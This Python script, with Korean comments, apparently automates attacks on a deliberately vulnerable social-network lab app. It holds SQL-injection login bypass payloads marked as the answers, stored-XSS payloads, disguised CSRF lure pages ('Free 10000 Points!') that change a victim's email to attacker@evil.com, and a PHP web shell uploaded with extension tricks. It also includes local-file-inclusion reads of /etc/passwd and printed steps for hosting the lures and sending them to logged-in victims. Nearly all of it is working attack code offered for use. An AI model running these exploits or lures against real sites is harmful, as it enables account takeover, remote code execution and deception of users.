import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, quote
import time
import json
import re

class VulnerableSNSAttacker:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.discovered_endpoints = set()
    
    def discover_endpoints(self):
        """애플리케이션 엔드포인트 발견"""
        print("\n[*] Endpoint Discovery")
        print("-" * 60)
        
        try:
            response = self.session.get(f"{self.base_url}/login.php", timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 모든 링크 수집
            for link in soup.find_all(['a', 'form', 'script', 'link']):
                if link.name == 'a' and link.get('href'):
                    endpoint = link.get('href')
                elif link.name == 'form' and link.get('action'):
                    endpoint = link.get('action')
                else:
                    continue
                
                if endpoint and not endpoint.startswith('http'):
                    self.discovered_endpoints.add(endpoint)
            
            print(f"[+] Discovered {len(self.discovered_endpoints)} endpoints")
            for ep in sorted(self.discovered_endpoints):
                print(f"    - {ep}")
            
        except Exception as e:
            print(f"[-] Discovery failed: {e}")
    
    def test_sql_injection_login(self):
        """SQL Injection 테스트 - 블랙박스 방식"""
        print("\n[*] Testing SQL Injection on Login Form")
        print("-" * 60)
        
        login_url = f"{self.base_url}/login.php"
        
        # 일반적인 SQL Injection 페이로드 (정답 포함)
        payloads = [
            # 정답 페이로드 - 큰따옴표 우회
            {"username": 'admin" OR "1"="1', "password": "anything"},
            {"username": 'admin" OR "1"="1"--', "password": ""},
            {"username": 'admin" OR "1"="1"-- ', "password": "test"},
            {"username": '" OR "1"="1', "password": ""},
            {"username": '" OR "1"="1"--', "password": "x"},
            
            # 기본 시도 (차단될 것)
            {"username": "admin' OR '1'='1", "password": "password"},
            {"username": "admin' OR '1'='1'--", "password": ""},
            {"username": "admin' OR '1'='1'#", "password": ""},
            
            # 더블쿼트 변형
            {"username": 'admin" OR 1=1--', "password": ""},
            {"username": 'x" OR "x"="x', "password": ""},
            {"username": '" OR ""="', "password": ""},
            
            # Union based
            {"username": "admin' UNION SELECT NULL,NULL,NULL--", "password": ""},
            {"username": 'admin" UNION SELECT NULL,NULL,NULL--', "password": ""},
            
            # 시간 기반
            {"username": "admin' AND SLEEP(5)--", "password": ""},
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                print(f"[{i}/{len(payloads)}] Testing: {payload['username'][:50]}")
                
                start_time = time.time()
                response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
                elapsed = time.time() - start_time
                
                # 디버그: 응답 확인
                print(f"    Status: {response.status_code}, URL: {response.url}")
                
                # 로그인 실패 확인 (이게 있으면 실패)
                failure_indicators = [
                    'login' in response.url.lower(),
                    '로그인 실패' in response.text,
                    '사용자명 또는 비밀번호' in response.text,
                    'login failed' in response.text.lower(),
                ]
                
                # 성공 지표 확인
                success_indicators = [
                    'index.php' in response.url,
                    'logout.php' in response.text.lower(),
                    'new_post.php' in response.text.lower(),
                    'upload.php' in response.text.lower(),
                    'vulnerablesns' in response.text.lower() and 'login' not in response.url.lower(),
                ]
                
                # 실패한 경우 스킵
                if any(failure_indicators):
                    print(f"    Login failed - staying on login page")
                    continue
                
                # 시간 기반 SQLi 확인
                if elapsed > 5:
                    print(f"[+] Time-based SQLi detected (delay: {elapsed:.2f}s)")
                    self.vulnerabilities['sql_injection'].append({
                        'url': login_url,
                        'payload': payload,
                        'type': 'time_based',
                        'delay': elapsed
                    })
                
                if any(success_indicators):
                    print(f"[+] SQL Injection successful - Authentication bypassed")
                    print(f"    Current URL: {response.url}")
                    
                    self.logged_in = True
                    self.vulnerabilities['sql_injection'].append({
                        'url': login_url,
                        'payload': payload,
                        'type': 'authentication_bypass'
                    })
                    return True
                
                # 에러 기반 SQLi 확인 (로그인 실패했지만 에러 발생)
                if not self.logged_in:
                    error_patterns = [
                        'sql', 'mysql', 'syntax error', 'query', 
                        'warning', 'database', 'mysqli', 'error in your sql'
                    ]
                    error_found = any(pattern in response.text.lower() for pattern in error_patterns)
                    
                    if error_found and i == 1:  # 첫 번째 페이로드에서만 출력
                        print(f"[!] SQL error messages detected in responses")
                        print(f"    This indicates SQL injection vulnerability exists")
                        # 에러 기반 SQLi는 따로 기록하지 않음 (너무 많아지므로)
                    
            except requests.Timeout:
                print(f"[!] Request timeout - possible time-based SQLi")
                self.vulnerabilities['sql_injection'].append({
                    'url': login_url,
                    'payload': payload,
                    'type': 'time_based',
                    'note': 'Request timed out'
                })
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        print(f"\n[-] All SQL injection attempts failed")
        print(f"[*] Trying basic credentials...")
        
        # 기본 계정 시도
        basic_creds = [
            {"username": "admin", "password": "admin123"},
            {"username": "admin", "password": "admin"},
            {"username": "alice", "password": "alice2024"},
            {"username": "bob", "password": "bobby123"},
        ]
        
        for cred in basic_creds:
            try:
                print(f"[*] Trying: {cred['username']} / {cred['password']}")
                response = self.session.post(login_url, data=cred, allow_redirects=True, timeout=10)
                
                if 'index.php' in response.url or 'logout' in response.text.lower():
                    print(f"[+] Login successful with credentials: {cred['username']}")
                    self.logged_in = True
                    return True
            except:
                continue
        
        return False
    
    def test_xss_in_posts(self):
        """XSS 테스트 - 게시물 작성"""
        print("\n[*] Testing XSS in Post Creation")
        print("-" * 60)
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        # 게시물 작성 페이지 찾기
        possible_urls = [
            f"{self.base_url}/new_post.php",
            f"{self.base_url}/create_post.php",
            f"{self.base_url}/post.php"
        ]
        
        post_url = None
        for url in possible_urls:
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and 'textarea' in response.text.lower():
                    post_url = url
                    print(f"[+] Found post creation page: {url}")
                    break
            except:
                continue
        
        if not post_url:
            print("[-] Post creation page not found")
            return False
        
        # XSS 페이로드 (정답 포함)
        xss_payloads = [
            # 정답 - 이벤트 핸들러 사용 (script 태그 우회)
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert(document.cookie)>",
            "<input onfocus=alert('XSS') autofocus>",
            "<img src=x onerror=alert(1)>",
            
            # 기본 (차단될 것)
            "<script>alert('XSS')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            
            # 대소문자 혼합
            "<ScRiPt>alert('XSS')</sCrIpT>",
            
            # 인코딩
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>",
            
            # 기타 이벤트 핸들러
            "<div onmouseover=alert(1)>hover</div>",
            "<marquee onstart=alert(1)>XSS</marquee>",
        ]
        
        success_count = 0
        
        for i, payload in enumerate(xss_payloads, 1):
            try:
                print(f"[{i}/{len(xss_payloads)}] Testing: {payload[:60]}")
                
                data = {'content': payload}
                response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)
                
                # 리다이렉트 확인
                if 'index.php' in response.url or 'home' in response.url:
                    time.sleep(0.5)
                    
                    # 메인 페이지에서 페이로드 확인
                    check_response = self.session.get(f"{self.base_url}/index.php")
                    
                    # 필터링되지 않고 그대로 출력되는지 확인
                    if payload in check_response.text:
                        print(f"[+] Stored XSS confirmed - Payload reflected without encoding")
                        success_count += 1
                        
                        self.vulnerabilities['xss'].append({
                            'url': post_url,
                            'payload': payload,
                            'type': 'stored',
                            'location': 'index.php'
                        })
                    
                    # 부분적으로 필터링된 경우도 확인
                    elif any(tag in check_response.text for tag in ['<img', '<svg', 'onerror', 'onload']):
                        print(f"[+] Possible XSS - Payload partially present")
                        self.vulnerabilities['xss'].append({
                            'url': post_url,
                            'payload': payload,
                            'type': 'stored',
                            'location': 'index.php',
                            'status': 'partial'
                        })
                
                # 블로킹된 경우
                elif 'error' in response.text.lower() or 'block' in response.text.lower():
                    print(f"[-] Payload blocked by filter")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        print(f"\n[*] XSS testing completed: {success_count} successful payloads")
        return success_count > 0
    
    def test_csrf(self):
        """CSRF 테스트"""
        print("\n[*] Testing CSRF Protection")
        print("-" * 60)
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        # 프로필 페이지 찾기
        profile_url = f"{self.base_url}/profile.php"
        
        try:
            # 프로필 페이지 가져오기
            response = self.session.get(profile_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # CSRF 토큰 확인
            csrf_token_found = False
            for input_tag in soup.find_all('input', {'type': 'hidden'}):
                if 'csrf' in input_tag.get('name', '').lower():
                    csrf_token_found = True
                    print(f"[!] CSRF token found: {input_tag.get('name')}")
                    break
            
            if not csrf_token_found:
                print(f"[+] No CSRF token detected")
            
            # GET 요청으로 프로필 수정 시도
            test_email = f"csrf_test_{int(time.time())}@test.com"
            csrf_test_url = f"{profile_url}?email={test_email}&full_name=CSRF_Test"
            
            print(f"[*] Testing CSRF via GET request")
            print(f"    URL: {csrf_test_url[:80]}")
            
            test_response = self.session.get(csrf_test_url, allow_redirects=True, timeout=10)
            
            # 변경 확인
            time.sleep(0.5)
            verify_response = self.session.get(profile_url)
            
            if test_email in verify_response.text:
                print(f"[+] CSRF vulnerability confirmed - Profile modified via GET")
                
                self.vulnerabilities['csrf'].append({
                    'url': profile_url,
                    'method': 'GET',
                    'type': 'state_change_via_get',
                    'modified_field': 'email',
                    'test_value': test_email
                })
                
                self.generate_csrf_poc(profile_url, test_email)
                return True
            else:
                print(f"[-] CSRF not exploitable via GET")
                
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return False
    
    def generate_csrf_poc(self, profile_url, test_email):
        """CSRF PoC 생성 - 공격자 서버로 호스팅"""
        
        # 1. GET 방식 CSRF PoC
        csrf_get_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Free 10000 Points!</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }}
        .container {{
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Congratulations!</h1>
        <p>You've won 10,000 points!</p>
        <p>Click the button below to claim your reward</p>
        <button onclick="location.reload()">Claim Now</button>
    </div>
    
    <!-- Hidden CSRF Attack -->
    <img src="{profile_url}?email=attacker@evil.com&full_name=Hacked&bio=CSRF_Attack" 
         style="display:none" 
         onload="attackSuccess()" 
         onerror="attackFailed()">
    
    <script>
        function attackSuccess() {{
            console.log('[+] CSRF attack successful');
        }}
        function attackFailed() {{
            console.log('[-] CSRF attack failed');
        }}
    </script>
</body>
</html>"""
        
        # 2. POST 방식 CSRF PoC (선물 보내기)
        csrf_post_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Free Gift Event!</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
        }}
        .container {{
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Special Event!</h1>
        <p>Participate in our event to win amazing prizes!</p>
        <p>Processing your entry...</p>
        <div id="status">Please wait...</div>
    </div>
    
    <!-- Hidden POST CSRF Form - Send Gift Attack -->
    <form id="gift_form" method="POST" action="{profile_url}" style="display:none">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="receiver_id" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="points" value="5000">
        <input type="hidden" name="message" value="CSRF Attack">
    </form>
    
    <script>
        // Auto-submit after 1 second
        setTimeout(function() {{
            document.getElementById('gift_form').submit();
            document.getElementById('status').innerHTML = 'Completed! Thank you!';
        }}, 1000);
    </script>
</body>
</html>"""
        
        # 3. Combined CSRF Attack (Profile + Gift)
        csrf_combined_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login Required</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f5f5f5;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            max-width: 400px;
            margin: 0 auto;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Session Expired</h2>
        <p>Please wait while we redirect you...</p>
        <div id="status">Redirecting...</div>
    </div>
    
    <!-- Attack 1: Profile modification via GET -->
    <img src="{profile_url}?email=attacker@evil.com&full_name=Compromised&bio=Hacked_via_CSRF" 
         style="display:none">
    
    <!-- Attack 2: Send gift via POST -->
    <form id="gift_attack" method="POST" action="{profile_url}" style="display:none">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="receiver_id" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="points" value="9999">
        <input type="hidden" name="message" value="CSRF_Stolen">
    </form>
    
    <script>
        // Execute attacks in sequence
        setTimeout(function() {{
            document.getElementById('gift_attack').submit();
        }}, 1500);
        
        setTimeout(function() {{
            document.getElementById('status').innerHTML = 'Completed';
        }}, 2000);
    </script>
</body>
</html>"""
        
        # 파일 저장
        with open("csrf_get_attack.html", 'w', encoding='utf-8') as f:
            f.write(csrf_get_html)
        print(f"[+] CSRF GET attack saved: csrf_get_attack.html")
        
        with open("csrf_post_attack.html", 'w', encoding='utf-8') as f:
            f.write(csrf_post_html)
        print(f"[+] CSRF POST attack saved: csrf_post_attack.html")
        
        with open("csrf_combined_attack.html", 'w', encoding='utf-8') as f:
            f.write(csrf_combined_html)
        print(f"[+] CSRF combined attack saved: csrf_combined_attack.html")
        
        # 사용 방법 출력
        print(f"\n[*] How to use CSRF attacks:")
        print(f"    1. Host these HTML files on attacker server")
        print(f"    2. Send victim the link while they are logged in")
        print(f"    3. When victim clicks, attacks execute automatically")
        print(f"\n[*] Example hosting:")
        print(f"    python3 -m http.server 8000")
        print(f"    Share: http://your-ip:8000/csrf_combined_attack.html")
    
    def test_file_upload(self):
        """파일 업로드 취약점 테스트"""
        print("\n[*] Testing File Upload")
        print("-" * 60)
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        upload_url = f"{self.base_url}/upload.php"
        
        # 웹쉘 페이로드
        webshell_content = b"<?php system($_GET['cmd']); ?>"
        
        # 다양한 파일 확장자 시도 (정답 포함)
        test_files = [
            # 정답 - .php 우회
            ('shell.php5', webshell_content, 'application/x-php'),
            ('shell.phtml', webshell_content, 'application/x-php'),
            ('shell.php3', webshell_content, 'application/x-php'),
            
            # 기본 (차단될 것)
            ('test.php', webshell_content, 'application/x-php'),
            
            # 기타 시도
            ('test.php7', webshell_content, 'text/plain'),
            ('test.phps', webshell_content, 'text/plain'),
        ]
        
        for filename, content, mime_type in test_files:
            try:
                print(f"[*] Uploading: {filename}")
                
                files = {'file': (filename, content, mime_type)}
                response = self.session.post(upload_url, files=files, allow_redirects=True, timeout=10)
                
                # 업로드 성공 확인
                success_indicators = [
                    'success' in response.text.lower(),
                    'uploaded' in response.text.lower(),
                    filename in response.text
                ]
                
                if any(success_indicators):
                    print(f"[+] File uploaded successfully")
                    
                    # 업로드된 파일 경로 추출
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = soup.find_all('a', href=True)
                    
                    uploaded_path = None
                    for link in links:
                        href = link.get('href')
                        if filename in href:
                            uploaded_path = href
                            break
                    
                    if uploaded_path:
                        print(f"[+] File accessible at: {uploaded_path}")
                        
                        # 파일 실행 테스트
                        if self.test_webshell_execution(filename):
                            self.vulnerabilities['file_upload'].append({
                                'url': upload_url,
                                'filename': filename,
                                'path': uploaded_path,
                                'type': 'malicious_upload_rce'
                            })
                            return True
                    
                    self.vulnerabilities['file_upload'].append({
                        'url': upload_url,
                        'filename': filename,
                        'type': 'malicious_upload'
                    })
                else:
                    print(f"[-] Upload blocked or failed")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return False
    
    def test_webshell_execution(self, filename):
        """웹쉘 실행 테스트"""
        print(f"[*] Testing webshell execution: {filename}")
        
        # 정답 경로 우선 시도
        priority_paths = [
            f"/file.php?name={filename}",  # 정답: file.php를 통한 접근
            f"/file.php?name=../uploads/{filename}",
            f"/uploads/{filename}",
        ]
        
        # 추가 가능한 경로
        additional_paths = [
            f"/file.php?file={filename}",
            f"/files/{filename}",
            f"/upload/{filename}",
            f"/view.php?name={filename}",
        ]
        
        test_cmd = "whoami"
        all_paths = priority_paths + additional_paths
        
        for path in all_paths:
            try:
                test_url = f"{self.base_url}{path}"
                
                # 기본 접근
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] File accessible: {test_url}")
                
                # 명령어 실행 시도
                cmd_url = f"{test_url}&cmd={test_cmd}"
                cmd_response = self.session.get(cmd_url, timeout=5)
                
                # 명령어 출력 확인
                if len(cmd_response.text) > 0 and len(cmd_response.text) < 1000:
                    # 단순히 파일 내용이 아니라 명령어 실행 결과로 보이는 경우
                    if not '<?php' in cmd_response.text:
                        print(f"[+] Command execution successful")
                        print(f"    Output: {cmd_response.text[:100]}")
                        
                        self.vulnerabilities['file_upload'].append({
                            'url': cmd_url,
                            'type': 'rce',
                            'command': test_cmd,
                            'output': cmd_response.text[:200]
                        })
                        return True
                        
            except Exception as e:
                continue
        
        return False
    
    def test_lfi(self):
        """LFI 취약점 테스트"""
        print("\n[*] Testing Local File Inclusion")
        print("-" * 60)
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        # LFI 가능한 엔드포인트 찾기
        lfi_endpoints = [
            "/file.php?name=",
            "/file.php?file=",
            "/view.php?page=",
            "/include.php?file=",
            "/download.php?file=",
        ]
        
        # LFI 페이로드 (정답 포함)
        lfi_payloads = [
            # 정답 - ../ 두 번만 (세 번은 차단됨)
            ("../../etc/passwd", "root:"),
            ("../../etc/hosts", "localhost"),
            ("../config.php", "DB_"),
            
            # 절대 경로 (정답)
            ("/etc/passwd", "root:"),
            ("/etc/hosts", "localhost"),
            
            # 차단될 것 (세 번)
            ("../../../etc/passwd", "root:"),
            ("../../../../etc/passwd", "root:"),
        ]
        
        for endpoint in lfi_endpoints:
            for payload, indicator in lfi_payloads:
                try:
                    test_url = f"{self.base_url}{endpoint}{quote(payload)}"
                    print(f"[*] Testing: {endpoint}{payload[:30]}")
                    
                    response = self.session.get(test_url, timeout=5)
                    
                    if indicator in response.text:
                        print(f"[+] LFI confirmed - {indicator} found in response")
                        
                        self.vulnerabilities['lfi'].append({
                            'url': test_url,
                            'payload': payload,
                            'indicator': indicator,
                            'type': 'local_file_inclusion'
                        })
                        return True
                        
                except Exception as e:
                    continue
        
        return False
    
    def run_assessment(self):
        """전체 보안 평가 실행"""
        print("\n" + "="*60)
        print("Vulnerability Assessment - Gray Box Testing")
        print("="*60)
        print(f"Target: {self.base_url}")
        print("="*60)
        
        # 1. 엔드포인트 발견
        self.discover_endpoints()
        
        # 2. SQL Injection 테스트
        time.sleep(1)
        self.test_sql_injection_login()
        
        # 3. XSS 테스트
        time.sleep(1)
        if self.logged_in:
            self.test_xss_in_posts()
        
        # 4. CSRF 테스트
        time.sleep(1)
        if self.logged_in:
            self.test_csrf()
        
        # 5. 파일 업로드 테스트
        time.sleep(1)
        if self.logged_in:
            self.test_file_upload()
        
        # 6. LFI 테스트
        time.sleep(1)
        if self.logged_in:
            self.test_lfi()
        
        # 결과 출력
        self.print_report()
    
    def print_report(self):
        """평가 결과 출력"""
        print("\n" + "="*60)
        print("Assessment Report")
        print("="*60)
        
        total_vulns = sum(len(v) for v in self.vulnerabilities.values())
        print(f"\nTotal vulnerabilities found: {total_vulns}\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"\n[{vuln_type.upper()}] - {len(vulns)} vulnerability(ies)")
                print("-" * 60)
                for i, vuln in enumerate(vulns, 1):
                    print(f"{i}. Type: {vuln.get('type', 'N/A')}")
                    print(f"   URL: {vuln.get('url', 'N/A')[:70]}")
                    if 'payload' in vuln:
                        payload_str = str(vuln['payload'])
                        if isinstance(vuln['payload'], dict):
                            payload_str = vuln['payload'].get('username', '')
                        print(f"   Payload: {payload_str[:60]}")
                    if 'output' in vuln:
                        print(f"   Output: {vuln['output'][:80]}")
                    print()
        
        # JSON 리포트 저장
        report = {
            'target': self.base_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_vulnerabilities': total_vulns,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open('assessment_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] Full report saved: assessment_report.json")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python script.py <target_url>")
        print("Example: python script.py http://18.179.53.107/vulnerable-sns/www")
        sys.exit(1)
    
    target = sys.argv[1]
    
    attacker = VulnerableSNSAttacker(target)
    attacker.run_assessment()
    
    print("\n" + "="*60)
    print("Assessment completed")
    print("="*60)